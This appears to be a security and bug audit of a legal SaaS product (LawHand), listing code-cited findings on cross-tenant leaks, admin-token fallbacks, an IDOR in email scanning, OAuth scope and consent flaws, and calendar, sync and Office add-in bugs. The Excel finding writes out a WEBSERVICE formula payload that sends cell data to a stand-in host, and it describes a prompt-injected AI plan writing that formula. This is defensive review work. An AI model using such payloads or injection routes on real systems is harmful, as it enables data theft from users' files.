title: Shared platform Google service account can surface other tenants' Shared Drive files
claim: One platform service account (GOOGLE_SERVICE_ACCOUNT_KEY) is added as fileOrganizer to every Workspace tenant's auto-created Shared Drive (cloud_init.py:1214-1244). When no per-user Google grant exists or no user_id is passed (admin test search cloud_admin.py:465, tenant sync_all), cloud_search._get_google_token (cloud_search.py:1516-1527) and cloud_sync._get_token (cloud_sync.py:833-864) return the service-account token. _search_google_drive then queries corpora=allDrives with no driveId when there is no matter folder (cloud_search.py:666-676), fetch_contents downloads the hits (1098-1138), and there is no post-filter on drive_id (333-347). The prefer_service_account probe (google_service_account.py:213-258) only checks access to this tenant's drive and does not scope the query. Result: firm A's chat or index can include firm B's Shared Drive titles and content, a cross-tenant confidentiality breach.

title: Live cloud search/fetch falls back to the connecting admin's delegated token for every user
claim: cloud_search._get_microsoft_token (cloud_search.py:1529-1543) and _get_google_token (1516-1527) fall back to token_vault.get_fresh_token (the tenant credential, i.e. the delegated refresh token of the admin who connected) when the requesting user has no personal grant. rag._connected_providers treats that tenant credential as connected for every user (rag.py:344-376) and RAG calls connected-source search for any user (rag.py:1889-1906). Consequently Graph /search/query message hits search the admin's mailbox (cloud_search.py:941-986) and _fetch_outlook_content downloads full MIME from /me/messages/{id}/$value (1329-1362); driveItem search returns anything the admin can see; Gmail search (751-850) and full-body fetch (1140-1167) are not matter-scoped; matter-scoped searches still keep 'outlook' in the global query (_microsoft_sources_without_scoped, 1745-1764). Any firm user's chat can therefore return the admin's private email bodies and OneDrive/SharePoint/Drive files, bypassing provider permissions and ethical walls. The Hub copy's 'Confirm the ... mailbox boundary' (IntegrationsHub.jsx:100) has no backing control.

title: Scheduled cloud sync indexes the admin's personal mailbox into the tenant-wide search index
claim: sync_all calls sync_outlook_mail(db, tenant_id) with no user_id (cloud_sync.py:153-160), so _get_token uses the tenant (admin) delegated token and /me/messages is the admin's mailbox (cloud_sync.py:725-830); the 200 newest subjects, participants and 500-char bodyPreview are upserted into cloud_metadata_index. The Gmail path does the same for the admin's last 7 days of mail (cloud_sync.py:128-134, 455-568; also noted in google#D1 and sync#D1). search_index filters only on tenant_id and provider/object_type (cloud_search.py:471-507) with no owner ACL, RAG calls it for every user (rag.py:1889-1905), and the scheduler runs it on an interval (scheduler.py:804-810). Partner/HR/privileged mail subjects and snippets become retrievable by every user.

title: Task calendar pushes write every assignee's deadlines into the connecting admin's calendar
claim: google_calendar._get_token (google_calendar.py:18-38) and microsoft_calendar._get_token (microsoft_calendar.py:23-44) return the tenant (admin) token whenever the assignee has no per-user token or its refresh fails, because upsert_task_event does not pass exact_user. push_task_to_calendars fires upsert_task_event to both providers for every dated task (task_notifications.py:270-317), so events land in the admin's /me/events or primary calendar (microsoft_calendar.py:132-181). Titles/descriptions include matter and client names. The assignee gets nothing, revocation is masked, and the admin's calendar (and anyone it is shared with) sees other lawyers' matters, including walled ones.

title: Microsoft admin connect omits openid, so tier stays 'unknown' and Entra directory sync is permanently blocked
claim: MICROSOFT_ADMIN_SCOPES (integrations.py:241-244) lacks openid/profile, so the admin callback (integrations.py:568-615) receives no id_token; claims is None, detect_microsoft(None) returns ('unknown', None), and apply_detection still stamps account_detected_at (account_detect.py:184-189), so backfill_unknown_credentials skips the row forever (account_detect.py:140-141). capabilities._directory_sync returns unavailable for an unknown tier (capabilities.py:98-103) and user_sync._directory_sync_blocked turns every Microsoft sync into not_applicable (user_sync.py:122-124). service_account_email is never set, so send_admin_notification never uses Graph (email_admin.py:106) and 'Granted by' is blank. Reconnecting cannot fix it; no test covers the MS admin callback token response.

title: Microsoft Auto mode stores firm matter files in the connecting admin's personal OneDrive
claim: In Auto mode an active Microsoft connection binds storage to 'onedrive' (matter_file_store.py:150-153, 199-204; integrations.py:1996-2002). Every admin connect creates the LawHand root in the admin's /me/drive via _ensure_cloud_root (integrations.py:2398-2438; cloud_init.py:148-166, 1506-1508), and all reads/writes use the tenant delegated token against /me/drive/items/{parent} (matter_file_store.py:42-56, 832, 866-871). No sharing to other firm users exists on the OneDrive path, so 'Open cloud copy'/co-authoring is access-denied for other staff; storage_root_ownership rates it at_risk but only surfaces that in onboarding, contradicting the org-owned-root design (docs/storage-root-ownership-and-handoff.md:12-14, 28). When the admin leaves, is disabled or hits Conditional Access, all matter storage fails, and OneDrive retention after account deletion can destroy firm records.

title: Removing a matter assignee never revokes the cloud folder share granted to them
claim: Assignees are invited with write roles via /me/drive/items/{id}/invite (cloud_init.py:617-697, called from matters.py:185-218, 3095, 3188, 3263, 3402), but remove_assignment (matters.py:1772-1825) deletes the row and cleans calendars without calling DELETE .../permissions/{id}; the codebase has no unshare function. A lawyer screened off a matter keeps write access to its OneDrive/SharePoint/Drive folder indefinitely.

title: Editing a matter document in Word/Drive (as the UI invites) permanently breaks LawHand access with a 409
claim: Download reads cloud bytes with expected_size=doc.file_size (matter_documents.py:750-806) and read_matter_file_bytes enforces the stored size (matter_file_store.py:233-242, 1543-1551), so any edit via the 'Open in OneDrive/Google Drive' link (MatterDocumentsTab.jsx:1139-1147, 1278-1287) raises an integrity error, marks storage_state='conflict' and 409s every later download. E-sign creation reads with the same check (esignature.py:449-456). Folder sync never updates MatterDocument size/hash and only task-bound AI drafts have an adopt endpoint (tasks.py:1906), while the upload toast says 'Edits happen in the firm's cloud copy' (MatterDocumentsTab.jsx:440-444). Edited documents can no longer be downloaded, signed or fed to AI.

title: Template/agent DOCX drafts default to plain-text edit mode; a save flattens formatting and truncates at 50k chars
claim: propose_document_from_template and propose_matter_document_file build MatterDocumentDraftAction without document_edit_mode (chat_tools/handlers.py:1835-1850), so it defaults to 'lawhand_text' (schemas/chat_action.py:439); only the cloud-sync path sets 'office_snapshot' (tasks.py:2109). A text save (tasks.py:1806-1835) creates a revision from the extracted preview (capped at 50k chars) and re-renders via render_revision_docx with python-docx default styles (cloud_artifact_materialization.py:260-270, 435-440). This contradicts docs/workspace_mcp_adapter.md:489-491 (snapshots stay read-only so a save cannot flatten formatting). A typo fix strips letterhead, tables, headers/footers and drops content past ~50k chars, and approval binds to the damaged DOCX. Behind WORKSPACE_MCP_ENABLED/workflow runs.

title: /api/email/scan lets any user scan another user's mailbox via body.user_id
claim: email_agent.py:31-65 sets user_id = str(user.id) if not body.user_id else body.user_id with no admin or ownership check; process_emails then loads that user's delegated mail token (email_agent.py:348-364). A paralegal can POST {user_id: partnerId} and receive the partner's inbox subjects, senders, AI summaries and drafted replies, and the scan writes notes/tasks attributed to the partner (IDOR).

title: Moved or renamed matter key dates leave stale events on Outlook/Google calendars
claim: Key-date pushes (calendar_sync.py:519-628) store no provider event id and dedupe on (subject, start date) read back from the provider. When a key date moves or the matter is renamed, a new event is created and the old one is never updated or deleted, so lawyers see the old court date beside the new one (missed-deadline risk).

title: Date-only task events are sent to Google Calendar with an empty (end == start) range
claim: google_calendar.py:52-53 sends all-day events with end.date == start.date, but Google's end.date is exclusive, so the range is empty; the Graph path correctly adds one day (microsoft_calendar.py:83-96). The failure is only logged (google_calendar.py:159-166) inside fire-and-forget code (task_notifications.py:36-50), and the unit test encodes end == start. Most deadlines (no due time) never reach Google Calendar and nobody is told. Needs live-API confirmation.

title: Per-user Microsoft tokens break OneDrive matter-folder search, sync and fetch because folders live in the admin's drive
claim: When a user has a personal Microsoft token it is preferred, and folder search, sync and content fetch call /me/drive/items/{adminFolderId}/... (cloud_search.py:1399-1435, esp. 1412; 1182-1184; cloud_sync.py:596-620). For an item in another user's drive Graph returns itemNotFound; _sync_graph_files logs and breaks (cloud_sync.py:1058-1064), and the matter 'Sync folder' route (matters.py:3407-3413) reports 'synced' with 0 files. Users who followed 'Connect Calendar' get empty matter cloud files and AI answers without matter documents, while unconnected users get results via the admin token. Fix requires drive-qualified paths (/drives/{driveId}/items/...).

title: After any storage migration, every scheduled sync force-rewalks the whole cloud tree and rewrites the index
claim: sync_all and sync_matter_folders call storage_migration_reindex.run(force=True) on every run (cloud_sync.py:80-111). That BFS makes one Graph/Drive call per folder plus marker downloads with no 429 handling (storage_discovery.py:233-298), then deletes and re-upserts all file rows (storage_migration_reindex.py:130-143). Any failure raises RuntimeError before mail sync runs (cloud_sync.py:85-88). Firms with thousands of matter folders make thousands of API calls every interval, get throttled, and all cloud sync (including mail metadata) fails continuously.

title: Directory sync re-activates admin-deactivated users, and their mailboxes keep being captured
claim: Every directory match sets user_row.is_active = True unconditionally (user_sync.py:175-181 for Microsoft, 321-327 for Google; also ms-graph#D7 at 170-173). Admin deactivation (admin.py:300-306) does not delete or revoke UserOAuthToken rows, and run_correspondence_capture iterates all token rows with no User.is_active or token-health filter (scheduler.py:1894-1916). A deactivated user is restored at the nightly directory sync and their mail is archived into matters every 30 minutes.

title: Directory sync never deprovisions disabled/suspended/deleted accounts and licenses guests and resource mailboxes
claim: Microsoft GET /users (user_sync.py:130-202) has no userType/assignedLicenses $filter and $select omits userType, so guests, rooms and shared mailboxes become role 'user' with license_active=True; accountEnabled=false only skips creation and never deactivates existing users (user_sync.py:154-156), and deleted users are never reconciled. The Google path (user_sync.py:305-351) skips suspended accounts instead of setting is_active=False, ignores deleted users, and creates every account license_active=True (346). Departed staff stay active and consume paid seats; external guests (clients/co-counsel in Teams) become licensed LawHand users. The Microsoft half is latent while the tier bug (ms-graph#D0) blocks MS sync, but live for Google and legacy MS credentials.

title: nginx forbids framing of /teams, so Teams tabs render as 'refused to connect'
claim: Server-level X-Frame-Options SAMEORIGIN and CSP frame-ancestors 'self' (nginx.conf:412-415) are inherited by location / (nginx.conf:690-700; again 763-768 and 1037 for :443), which serves the SPA /teams routes (App.jsx:346-353) that the committed Teams manifest targets (teams-app/manifest.json:25-51). Unlike /office/ (nginx/snippets/office_addin.conf:26) there is no /teams exception allowing teams.microsoft.com/*.teams.microsoft.com/*.cloud.microsoft ancestors, so both the personal and configurable tabs are blank in Teams.

title: Teams tabs depend on the SPA's SameSite=Lax cookie session with no Teams SSO exchange
claim: TeamsTabPage/TeamsTabConfigPage sit behind ProtectedRoute (App.jsx:195-197, 346-353), which redirects unauthenticated users to /login inside the Teams iframe. Auth cookies default to SameSite=Lax (config.py:60) and are not sent in a cross-site iframe. webApplicationInfo is declared (teams-app/manifest.json:48-51) but no code calls microsoftTeams.authentication.getAuthToken and routers/teams.py has no token-exchange endpoint (TASKS 1403 pending). Even after the framing fix, users hit a login page that cannot complete in the iframe.

title: Excel set_selected_values bypasses the unsafe-formula ban
claim: office_action_policy.py:168-183 checks set_selected_values only for JSON scalar type (53-57); the WEBSERVICE/HYPERLINK/external-reference regex (31-35) runs only for set_selected_formulas (185-203). The client writes range.values directly (office-addin/src/hosts/excelAdapter.ts:102), and Excel interprets a value starting with '=' as a formula; validation.ts:99-102 does not check values either. A prompt-injected plan can write '=WEBSERVICE("https://x/?"&A1)' to exfiltrate workbook data.

title: Office add-in cookie session fails in Office on the web and new Outlook (SameSite=Lax in cross-site iframe)
claim: The Office token exchange sets HTTP-only cookies (auth.py:1788-1790) with SameSite from _cookie_flags (auth.py:483-499; default lax, config.py:60), then the pane re-reads /auth/me with credentials (office-addin/src/auth/officeSession.ts:72-99). As the code's own comment (officeSession.ts:73-77) notes, the Lax cookie is not sent cross-site; on web hosts the pane is iframed under office.com / cloud.microsoft, so the pane shows 'Office sign-in completed without a LawHand session'. Only classic desktop clients work.

title: Workspace MCP OAuth supports only public clients, blocking Microsoft 365 Copilot and Gemini Enterprise
claim: AS metadata advertises token_endpoint_auth_methods_supported=['none'] (workspace_mcp_oauth.py:297); DCR rejects any other method and never returns a client_secret (313-404, esp. 350-363), and no admin/operator path creates a static confidential client (WorkspaceMCPClient is only created by DCR). Microsoft 365 Copilot MCP plugins require DCR that issues a secret and Gemini Enterprise requires client_id+client_secret, so ECO-09/12/21 are blocked; the ecosystem plan still lists this as existing leverage (docs/workspace-ecosystem-trials-onboarding-plan-2026-08-27.md:63).

title: Re-authorize for Personal-Google tenants always fails and bounces the admin into onboarding
claim: IntegrationsPanel.handleReauthorize (IntegrationsPanel.jsx:174-181) calls /integrations/google/connect?intent=admin without account_mode; the backend defaults to 'workspace' (integrations.py:658-662) and requests the directory scope, and the callback rejects the personal account with account_mode_mismatch (integrations.py:798-800). _error_redirect then sends all admin errors to /onboarding (integrations.py:1790-1807). A solo/personal-Gmail firm with a revoked token cannot repair it from Admin > Cloud.

title: SharePoint-backed matters appear unprovisioned and their documents are labelled 'Local'
claim: storageLabel() has no 'sharepoint' case and returns 'Local' (MatterDocumentsTab.jsx:68-73), and CloudFolderCard treats a matter as provisioned only if providers.onedrive or providers.google_drive exists (MatterDocumentsTab.jsx:157-165), although the backend stores cloud_folder['sharepoint'] and storage_backend='sharepoint' (cloud_init.py:510-588; matter_file_store.py:1360-1425). MatterDetailPage.jsx:144-161 skips SharePoint and labels any non-OneDrive folder 'Google Drive'; MatterSmbSharesTab.jsx:52-55, 227 omit it too. SharePoint firms see 'Document folders are not set up', a 'Set up folders' prompt, 'Open in Local' rows, a LOCAL chip and a 'Saved to Local' toast (MatterDocumentsTab.jsx:440-445).

title: MCP/workflow template render ignores Studio conditional and repeating regions
claim: render_workspace_template (document_template_workspace.py:274-284) calls fill_docx_template without collections= or regions=, whereas the in-app render passes collections=_repeat_collections(parties) and regions=stored_regions(schema) (document_templates.py:4687-4698). Studio regions exist only in the field map (template_regions.py:1-12), so drafts produced by external assistants or workflows include every if/unless clause and do not expand per-party sections: the same template yields different legal text depending on the render path.

title: Approved client email falls back to sending from the connecting admin's mailbox
claim: When the approver has no per-user grant, connected_mail uses the tenant credential (the admin's delegated token) with /me/sendMail and saveToSentItems=True (connected_mail.py:381-420); there is no shared-mailbox support (Mail.Send.Shared or /users/{shared}/sendMail). Clients receive correspondence from the managing partner's address, it lands in that partner's Sent Items, and replies go to the wrong person.

title: Gmail sync/search uses the Drive-only service-account token on org Shared Drive tenants and silently returns nothing
claim: cloud_sync._get_token applies prefer_service_account to every Google call, not just Drive (cloud_sync.py:833-864, esp. 854-864); the service-account token carries only DRIVE_SCOPES and no domain-wide-delegation subject (google_service_account.py:213-243). Gmail rejects it with 403, sync_gmail_metadata returns 0 without raising (cloud_sync.py:494-501), and Gmail search through cloud_search._get_google_token gets the same swap. Workspace firms on the default Shared Drive path never get Gmail indexed or searched and see a successful 0-item sync.

title: get_fresh_token holds a FOR UPDATE lock on the tenant token row for the caller's whole transaction
claim: get_fresh_token takes SELECT ... FOR UPDATE (token_vault.py:196-209) and returns without committing on the fresh-token path (token_vault.py:413-432). Concurrent requests needing the same tenant credential (every no-personal-token user in RAG/search) wait on lock_timeout=5s, after which _execute_locked_scalar returns None and the provider reads as 'not connected'. Microsoft sources intermittently drop out of answers under concurrent load. PLAUSIBLE from code reading.

title: Microsoft consent requests unused or over-broad scopes (Chat.ReadWrite, TeamsActivity.Send, per-user Files.ReadWrite.All, admin Mail.Read)
claim: Chat.ReadWrite and TeamsActivity.Send are required for teams_connected (teams.py:40-47; teams_gate.py:25-28), but nothing in backend/app calls /chats or sendActivityNotification and the Teams manifest has no activities block. Per-user Microsoft tokens are used only for reads (cloud_search, cloud_sync, document_sync), so Files.Read.All would suffice instead of Files.ReadWrite.All; admin Mail.Read only reaches the admin's own mailbox (feeding the mailbox-index leak); sign-in requests offline_access/User.Read and discards the tokens (auth.py:1324, 1372). Over-broad consent ('read and write all your chats', 'full access to all files') blocks law-firm security reviews.

title: Google scope sets exceed what the code uses (restricted Gmail, full Drive, full Calendar), including for the per-user 'Connect Calendar' grant
claim: All Google modes request gmail.readonly and full drive (restricted scopes needing annual CASA) plus full calendar (integrations.py:245-272). Code only touches calendars/primary/events (calendar.events suffices) and mostly app-created Drive files (drive.file suffices except drives.create and whole-Drive search/sync). The per-user grant (integrations.py:260-265) is launched from a 'Connect Calendar' button (api.js:2305-2307). GOOGLE_SOLO_SCOPES only drops directory, contrary to the 'least-privilege' claim (docs/onboarding-hotfix-review-2026-09-16.md:17). Consent abandonment and verification cost result.

title: Per-user Microsoft/Google connect has no identity or tenant/domain check
claim: The user-intent callbacks store whatever account completed consent: Microsoft uses the 'common' authority (config.py:108) with no openid, no /me lookup and no comparison to the user's Entra tid/oid or email domain (integrations.py:616-646); the Google user flow requests no openid/email so no id_token/hd is available (integrations.py:779-783). connected_mail then sends approved client correspondence from whichever account was connected (connected_mail.py:350-379), so privileged mail can go out from and be captured from a personal @gmail.com/Outlook.com account.

title: Capability matrix hard-codes email/calendar/cloud_storage 'ok' regardless of granted scopes
claim: capabilities.resolve() returns ok for email, calendar and cloud_storage irrespective of scopes (capabilities.py:158-175, esp. 169-171), even when Mail.Send, Calendars.ReadWrite, Files.ReadWrite.All or Google's granularly-declined Gmail/Drive scopes are missing. The scope gap is stored (integration_observability.py:42-56) but per-user rows with missing_scopes are counted needs_reauth forever (integration_observability.py:81); feature calls 403 and return [] with only a warning (e.g. cloud_search.py:678-687); there is no include_granted_scopes or incremental per-feature request. Admin UI shows 'Available' while features silently fail.

title: Plugin integration detection checks scopes LawHand never requests, so OneDrive/Google Drive never show as connected
claim: plugins.py:370-390 detects onedrive only for Files.Read.All and google_drive only for drive.readonly, but the connect flows request Files.ReadWrite.All and the full drive scope (integrations.py:241-259). Scope lists are hand-copied in four places (integrations.py:241-270, admin.py:1604-1622, plugins.py:370-389, integrations.py:2031-2035). Plugin cards (PluginsPage.jsx:88, PluginPage.jsx:159) omit OneDrive/Google Drive for fully connected firms.

title: Cancelled or blocked Microsoft/Google sign-in consent renders a raw FastAPI 422 JSON page
claim: microsoft_callback (auth.py:1338-1345) and google_callback (auth.py:1572-1579) declare code: str and state: str as required with no error parameter, so a provider redirect with ?error=access_denied/consent_required fails validation before the @_redirect_refusals_to_login wrapper (auth.py:1128-1142) runs; main.py has no RequestValidationError handler and loginErrors.js has no admin-consent message. The integrations callbacks handle error correctly (integrations.py:512-516).

title: LawHand text save on an AI draft silently orphans Word Online edits in the superseded file
claim: When superseding, cloud_artifact_materialization.materialize() only marks the previous document 'superseded' (cloud_artifact_materialization.py:661-676) and never reads the previous cloud object's current hash/eTag, while DocumentDraftWorkspace shows 'Open cloud working copy' beside the editable textarea and 'Save as new cloud revision' (DocumentDraftWorkspace.jsx:172-175) and TaskBoard assumes 'verified' storage (TaskBoard.jsx:1064). Word edits stay in the superseded -r1.docx and are missing from the approved revision without warning.

title: AI draft materialization requires an explicit primary_cloud_provider while uploads auto-bind
claim: cloud_artifact_materialization._configured_provider (276-295) raises CloudNotConfiguredError when the setting is blank, whereas MatterFileStore._resolve_provider_policy falls back to the active Microsoft or Google connection (matter_file_store.py:159-204). Auto-mode firms can save template documents to OneDrive but chat/MCP drafting fails with 'Choose and connect a primary tenant cloud provider'.

title: Deleting a Shared Drive matter document omits supportsAllDrives (file orphaned) and My Drive deletes bypass trash
claim: _delete_cloud_provider_object (matter_documents.py:261-289) issues DELETE files/{id} without supportsAllDrives=true, unlike the staged-cleanup path (matter_file_store.py:431-435); a Shared Drive item likely 404s, ProviderNotFound is treated as success and the DB record is removed (matter_documents.py:347-348). For My Drive, files.delete is permanent (Graph DELETE goes to the recycle bin). Deleted documents may persist in the Shared Drive, and accidental deletes cannot be recovered. PLAUSIBLE; confirm 404 against a live Shared Drive.

title: Filenames containing '#' or '%' break path-based OneDrive/SharePoint uploads
claim: The filename is interpolated unencoded into ':/{filename}:/content' (matter_file_store.py:866-871), createUploadSession (925) and the SharePoint path (1384-1387); '#' starts a URL fragment, truncating the path and dropping conflictBehavior. The inbound attachment sanitizer keeps '#' and '%' (inbound_email.py:271-283) and failures are logged and swallowed (inbound_email.py:386-400), so attachments like 'Exhibit #3.pdf' silently fail to file.

title: Correspondence capture ignores CC, so mail where the party is only copied is never captured
claim: The Graph $select omits ccRecipients (microsoft_mail.py:43-48) and Gmail metadataHeaders are only From/To/Subject/Date (google_mail.py:187-194), while correspondence_capture._email_addresses reads 'cc' (correspondence_capture.py:87-94), which is always empty. Messages copying the client or opposing counsel are missed despite the rules UI promising 'emails involving the matter's parties'.

title: Correspondence capture reads a fixed 50-message/7-day window with no pagination or cursor
claim: Each run reads the top CORRESPONDENCE_CAPTURE_MAX_EMAILS=50 messages from the last 7 days (correspondence_capture.py:406-419; microsoft_mail.py:38-50; google_mail.py:169-180) with no paging and no persisted cursor. More than 50 messages per 30-minute interval, or an outage over 7 days, leaves permanent gaps in the matter file.

title: Email agent and correspondence capture block each other's dedupe and re-spend LLM calls
claim: The email agent writes CommunicationLog(matter_id, external_ref='provider:id') with no document (email_agent.py:57-91); capture's _already_captured (correspondence_capture.py:217-233, 263-269) then skips the message so no .eml is archived. In the other order capture blocks note/task-tag creation (email_agent.py:64-77). process_emails classifies and drafts before any dedupe (email_agent.py:366-394), so every scan re-bills LLM classification and premium drafts.

title: Outbound client emails are filed twice on the matter
claim: The compose log (matters.py:2807-2818) stores no external_ref: Graph sendMail returns 202 with no id (connected_mail.py:128-138) and the Gmail id is returned but discarded (connected_mail.py:192-199). A later scan captures the Sent Items copy under 'provider:id' (correspondence_capture.py:258-269), producing two log rows and two .eml files per email.

title: Staff aliases count as matter parties, so the alias owner's mail is filed into all their matters
claim: correspondence_capture.py:160-173 adds verified aliases of every assigned user to party_addresses, and any address overlap triggers capture (200-207). Every message to/from an attorney's verified alias is copied into each matter they are assigned to, placing privileged mail on other clients' files.

title: Timed task events land at the wrong hour on Outlook and Google
claim: task_notifications.py:252-267 sends due_time in the matter's intake timezone (the client's) or UTC when there is no intake (matter_followups.py:29-44), while the LawHand calendar renders the same due_time as browser-local wall time (calendar.py:38-48); there is no firm or user timezone. A 2:00 PM deadline shows 2:00 PM in LawHand but 9:00 AM CDT in Outlook.

title: Key-date dedupe misses east of UTC+9 and beyond 100 events, creating duplicates on every sync
claim: Graph reads are normalized to UTC ('Prefer: outlook.timezone="UTC"', calendar_sync.py:100-122) and keyed on the UTC date [:10] (542-547) while events are created at 09:00 local (594); calendarView uses $top 100 with no @odata.nextLink, and Google uses maxResults 100 with no pageToken (344-350) over a 90-day window. Sydney/NZ firms and busy calendars get a new '[LawHand] ...' duplicate each sync.

title: Editing a scheduled event deletes and recreates it with the editor's token, re-inviting or orphaning
claim: Every PATCH (calendar.py:482-495) deletes and recreates the provider event using the editor's token rather than the creator's, the delete result is ignored (scheduled_events.py:125-142), and there is no creator/role check. Clients get a cancellation plus a new invite (and new Teams link) per edit; when another user edits or deletes, the original stays in the creator's calendar with the client still invited.

title: Google scheduled events never send invitations or cancellations (no sendUpdates), and cannot carry a Meet link
claim: events.insert (calendar_sync.py:446-498, esp. 485-493) and delete (512-516) are called without sendUpdates, which Google treats as 'none', so attendees receive neither invites nor cancellations; Graph sends invites by default (scheduled_events.py:66-92). There is also no conferenceData/hangoutsMeet option; meeting_provider allows only none/teams/zoom (schemas/calendar.py:101-106).

title: Cloud sync provider failures are recorded as successful syncs with 0 items
claim: On non-200 responses the provider loops break or return 0 instead of raising: Drive (cloud_sync.py:361-372), Gmail (493-501), Outlook (763-771), Graph files (1058-1064), SharePoint (641-661) and a missing token (330-332). The scheduler then records status='completed' (scheduler.py:1779-1790), contradicting the sync_all docstring (cloud_sync.py:75-77). Revoked consent or missing scopes show as a green 'completed, 0 ok' tile while the index goes stale.

title: Cloud sync holds a tenants row lock across hundreds of provider HTTP calls
claim: Every _upsert runs SELECT tenants FOR UPDATE plus a migration lookup (cloud_sync.py:884-889), and commit happens only after the whole provider loop (e.g. Gmail at 509-562 makes ~200 sequential HTTP calls, ~3 DB statements per item). Other writes to the tenant row (settings, onboarding, cutover) block or time out during every sync.

title: Tenant OneDrive and SharePoint index sync lists only root-level items
claim: sync_onedrive uses /me/drive/root/children (cloud_sync.py:584-594) and sync_sharepoint uses /drives/{id}/root/children (663-680) with no recursion or delta, so matter files in subfolders are absent from firm-wide search unless a per-matter sync runs.

title: Per-user Graph search requests listItem without Sites.Read.All, likely 403ing all driveItem hits
claim: Global Graph search sends entityTypes ['driveItem','listItem'] (cloud_search.py:937-986) with the per-user token, but MICROSOFT_USER_SCOPES has no Sites.Read.All (integrations.py:256-259). listItem requires it, so the request likely 403s and search_group returns None, giving users with a personal connection no OneDrive/SharePoint hits. PLAUSIBLE, needs live check.

title: Native Google Docs/Sheets are excluded from matter sync, firm-knowledge ingestion and search
claim: LEGAL_MIME_TYPES (cloud_sync.py:48-55) has no application/vnd.google-apps.* types; the matter-folder Drive query (cloud_sync.py:334-340) and document_sync (document_sync.py:22-28, 281-305) filter to PDF/DOCX/DOC/RTF/TXT, and the download uses alt=media (document_sync.py:370), which cannot fetch Docs; there is no files.export. Google Workspace firms drafting in Google Docs never see those documents in matters, search or AI context.

title: Committed teams-app/lawhand-teams.zip is stale (old domain and Entra app id) and not rebuilt by CI
claim: The manifest inside the tracked teams-app/lawhand-teams.zip points at legalapp.perevagagroup.com and webApplicationInfo id c805316c-..., while teams-app/manifest.json (6-51) uses getlawhand.com and 062a7776-.... CI never rebuilds it, package.ps1 needs Windows (System.Drawing), TASKS 1402 says 'do not commit the zip' yet it is tracked and still marked PENDING (TASKS.md:2371-2378), and TASKS.md:146 is open. An admin who uploads the checked-in zip installs an app that loads the wrong host.

title: Teams channel-tab save reports success without creating a working tab
claim: TeamsTabConfigPage calls setConfig only via window.microsoftTeams (TeamsTabConfigPage.jsx:69), which the ESM @microsoft/teams-js v2 import (line 2) does not define as a global; saveConfiguration swallows its own errors (79), so registerOnSaveHandler always calls notifySuccess (90) even when createTeamsLink failed. Admins can save a channel tab with no content URL or matter link and see no error.

title: Teams personal tab shows 'No channels linked' to every non-admin
claim: GET /links goes through require_teams_enabled, which requires the admin role (teams_gate.py:64-66; routers/teams.py:155-157); TeamsTabPage.jsx:10-12 swallows the 403 and renders an empty list, so attorneys and staff conclude no matter channels exist.

title: Office add-in CSP frame-ancestors omits *.cloud.microsoft
claim: nginx/snippets/office_addin.conf:26 allows only *.office.com, *.office365.com, *.live.com and *.microsoft.com; Microsoft 365 web apps are moving to word/excel/outlook/m365.cloud.microsoft, and frame-ancestors checks every ancestor including the top-level page, so the task pane can be blocked in Office on the web / new Outlook.

title: Outlook read-mode button uploads the full message body and then always fails as read-only
claim: The manifest advertises 'Review Outlook messages' on read items (office-addin/manifests/outlook.xml:13, 29-31, 41-53); main.ts:43-46 enables Propose without checking capabilities.writeEnabled, and the server rejects the plan with 'This Office host is read-only' (office_action_policy.py:72-73) after up to 50k characters of client email body were uploaded.

title: Office add-in session expires after 30 minutes with no refresh or re-auth
claim: authenticated is set once at startup (office-addin/src/main.ts:188-197); OfficeApi.request throws on any non-OK response (office-addin/src/api/officeApi.ts:21-28) and never calls /auth/refresh or re-runs session.ensure, while ACCESS_TOKEN_EXPIRE_MINUTES=30 (config.py:42). A pane left open fails with 'Not authenticated' until reopened.

title: Word apply replaces the selection as plain text with no tracked changes
claim: wordAdapter.ts:99-103 uses insertText(..., replace), dropping mixed formatting, fields, cross-references and footnote references in the selection; WordApi 1.4 is detected (line 21) but changeTrackingMode is never enabled, so an AI rewrite in a negotiated draft leaves no redline.

title: Office add-in audit-failure status is wrong on reject and overwritten on apply
claim: report() always says 'The Office change completed, but LawHand could not record its audit result' (office-addin/src/main.ts:101), including after a Reject where nothing changed (154-165); on a successful apply, setStatus('Approved change applied.') at line 142 immediately overwrites the audit-failure message, so unaudited AI changes go unnoticed.

title: Office planner sends Word selection/Outlook body to the Standard LLM route without the data-class check
claim: office_assistant.create_plan (office_assistant.py:115-150) always resolves use_premium=False and sends up to 50k chars (schemas/office_assistant.py:44-67) without calling route_matter_context_allowed; Standard is public-general by default (llm_routing.py:354-370), while chat enforces the gate (chat.py:2421-2430). In pilot tenants confidential document/email text can reach a provider not cleared for client data.

title: Office plan usage is recorded at $0 because costing matches the gateway alias
claim: _usage_record prices route.model (office_assistant.py:75-85), a LiteLLM alias like 'lawhand-standard' (config.py:267); calculate_cost only matches claude/gemini/deepseek substrings and returns 0 with a warning (billing.py:60-66). Chat uses the provider-reported model (chat.py:2916). Office AI spend is invisible in usage and billing.

title: Workspace MCP client registrations hard-expire after 30 days regardless of use
claim: WORKSPACE_MCP_CLIENT_REGISTRATION_DAYS=30 (config.py:444) and is_active requires expires_at > now (workspace_mcp_client.py:73-79); the token endpoint calls _active_client before refresh (workspace_mcp_oauth.py:704-705) and only updates last_used_at (806), never extending expiry, although grants last 90 days (config.py:443). Actively used connectors get invalid_client on day 31.

title: RFC 8707 resource parameter is mandatory at authorize and on every token grant including refresh
claim: resource: str = Query(...) (workspace_mcp_oauth.py:407-418) makes a missing resource a FastAPI 422 instead of an OAuth redirect error, and the token endpoint returns invalid_target when resource is absent for all grant types including refresh_token (706-708). Generic OAuth brokers (Teams Developer Portal, Power Platform, Gemini Enterprise) may not send it and fail at sign-in or first refresh.

title: Workspace MCP consent is all-or-nothing: one scope outside the user's role blocks the connection
claim: Consent is refused (403) unless every requested scope is in _allowed_user_scopes (workspace_mcp_oauth.py:487-495, 184-190; mapping 73-84), and the protected-resource challenge asks for all known scopes (workspace_mcp_protocol.py:144-150). A firm-wide Copilot/Gemini agent therefore fails for roles lacking manage_intake/manage_documents, with no indication which permission is missing.

title: MCP consent screen trusts a self-asserted client_name and admins cannot allowlist clients
claim: Any DCR client picks its client_name (workspace_mcp_oauth.py:365-372); the consent API returns only id and name (496-504) with no redirect host, publisher or verification, and WorkspaceMcpAuthorizePage.jsx:70 renders that name. The only controls are tenant/user on/off (workspace_mcp_access.py:31-43), contradicting docs/byo-harness-channel-contract.md:78-83. A registration named 'Microsoft 365 Copilot' can phish consent.

title: BYOK silently falls back to platform providers, and reconfiguring without the key erases it
